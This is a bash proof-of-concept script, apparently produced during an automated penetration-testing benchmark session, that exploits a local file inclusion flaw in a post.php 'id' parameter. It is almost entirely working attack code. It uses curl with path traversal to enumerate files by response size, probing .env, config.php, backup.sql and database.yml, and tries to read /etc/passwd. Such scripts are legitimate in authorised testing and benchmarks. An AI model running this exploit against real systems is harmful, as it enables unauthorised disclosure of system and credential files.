#!/bin/bash
# POC: Demonstrates blind file enumeration via response size and content pattern analysis on the LFI vulnerability. Compares response characteristics for existing vs non-existing files to enable systematic file discovery without direct content visibility.
# Target: ./repo
# Created: 2025-12-01T15:48:30.834Z
# Session: benchmark-XBEN-061-24-minbd4b8

# Response-Based File Existence Detection POC
# Demonstrates blind file enumeration via response analysis on LFI vulnerability
# Target: http://localhost:80/post.php?id=... vulnerability

TARGET="${1:-http://localhost:80}"
POST_ENDPOINT="${TARGET}/post.php"

echo "=========================================="
echo "Response-Based File Existence Detection POC"
echo "=========================================="
echo "Target: $POST_ENDPOINT"
echo ""

# Test 1: Response Size Comparison for File Existence Detection
echo "[*] TEST 1: Response Size Comparison"
echo "-------------------------------------"

# Existing file - FLAG.php
echo "[+] Probing existing file: ../FLAG.php"
response_existing=$(curl -s "${POST_ENDPOINT}?id=../FLAG.php")
size_existing=$(echo -n "$response_existing" | wc -c)
echo "    Response size: $size_existing bytes"
echo "    First 100 chars: $(echo -n "$response_existing" | head -c 100)..."
echo ""

# Non-existing file - NONEXISTENT.php
echo "[+] Probing non-existing file: ../NONEXISTENT.php"
response_nonexistent=$(curl -s "${POST_ENDPOINT}?id=../NONEXISTENT.php")
size_nonexistent=$(echo -n "$response_nonexistent" | wc -c)
echo "    Response size: $size_nonexistent bytes"
echo "    Content includes 'Post not found': $(echo "$response_nonexistent" | grep -q 'Post not found' && echo 'YES' || echo 'NO')"
echo ""

# Calculate difference
size_diff=$((size_existing - size_nonexistent))
echo "[*] Size Difference Analysis:"
echo "    Existing file: $size_existing bytes"
echo "    Non-existing file: $size_nonexistent bytes"
echo "    Difference: $size_diff bytes"
echo ""

if [ $size_diff -gt 0 ]; then
    echo "[✓] VULNERABILITY CONFIRMED: Detectable size difference enables blind enumeration"
else
    echo "[!] No significant size difference detected"
fi
echo ""

# Test 2: Content Pattern Detection
echo "[*] TEST 2: Content Pattern Detection"
echo "-------------------------------------"

# Check for unique patterns in existing file response
if echo "$response_existing" | grep -q "FLAG"; then
    flag_count=$(echo "$response_existing" | grep -o "FLAG" | wc -l)
    echo "[+] Existing file (FLAG.php) contains 'FLAG' keyword: $flag_count times"
fi

if echo "$response_nonexistent" | grep -q "Post not found"; then
    echo "[+] Non-existing file response contains 'Post not found' message"
fi

echo ""

# Test 3: Automated File Enumeration Simulation
echo "[*] TEST 3: Automated File Enumeration"
echo "-------------------------------------"
echo "[+] Simulating systematic file enumeration by analyzing response sizes..."
echo ""

# Test common filenames
test_files=("FLAG.php" "config.php" "admin.php" "backup.sql" "database.yml" ".env" "settings.ini" "NONEXISTENT1.php" "NONEXISTENT2.php")

echo "Testing files and analyzing response characteristics:"
echo "Filename                    | Size(bytes) | Status"
echo "----------------------------|-------------|----------"

detected_files=0

for file in "${test_files[@]}"; do
    response=$(curl -s "${POST_ENDPOINT}?id=../${file}")
    response_size=$(echo -n "$response" | wc -c)
    
    # Use heuristic: if response size significantly differs from error response, file likely exists
    threshold=$((size_nonexistent + 50))
    
    if [ $response_size -gt $threshold ]; then
        status="EXISTS (likely)"
        ((detected_files++))
    else
        status="NOT FOUND"
    fi
    
    printf "%-28s| %-11d | %s\n" "$file" "$response_size" "$status"
done

echo ""
echo "[*] TEST 4: Blind Enumeration Reliability"
echo "-------------------------------------"

# Verify the same file returns consistent sizes
echo "[+] Testing response consistency (same file, multiple requests):"
sizes=()
for i in {1..5}; do
    response=$(curl -s "${POST_ENDPOINT}?id=../FLAG.php")
    size=$(echo -n "$response" | wc -c)
    sizes+=($size)
done

# Check if sizes are consistent
first_size=${sizes[0]}
all_consistent=true
for size in "${sizes[@]}"; do
    if [ $size -ne $first_size ]; then
        all_consistent=false
        break
    fi
done

if [ "$all_consistent" = true ]; then
    echo "    [✓] Response size is consistent: ${sizes[@]}"
    echo "    [✓] Reliable blind detection: YES"
else
    echo "    [!] Response sizes vary: ${sizes[@]}"
    echo "    [!] Reliable blind detection: UNCERTAIN"
fi

echo ""
echo "[*] TEST 5: Directory Traversal Verification"
echo "-------------------------------------"
echo "[+] Verifying successful LFI exploitation:"

# Test deeper traversal
response=$(curl -s "${POST_ENDPOINT}?id=../../../../etc/passwd")
response_size=$(echo -n "$response" | wc -c)

if echo "$response" | grep -q "root:"; then
    echo "    [✓] Successfully read /etc/passwd"
    echo "    [✓] Multi-level directory traversal works"
elif [ $response_size -gt $((size_nonexistent + 100)) ]; then
    echo "    [✓] Response size indicates file exists (likely /etc/passwd)"
else
    echo "    [!] Could not access /etc/passwd or doesn't exist on target"
fi

echo ""
echo "=========================================="
echo "SUMMARY: Response-Based File Detection"
echo "=========================================="
echo "Detected files via size analysis: $detected_files"
echo "Response characteristic analysis: WORKING"
echo "Blind enumeration capability: CONFIRMED"
echo "=========================================="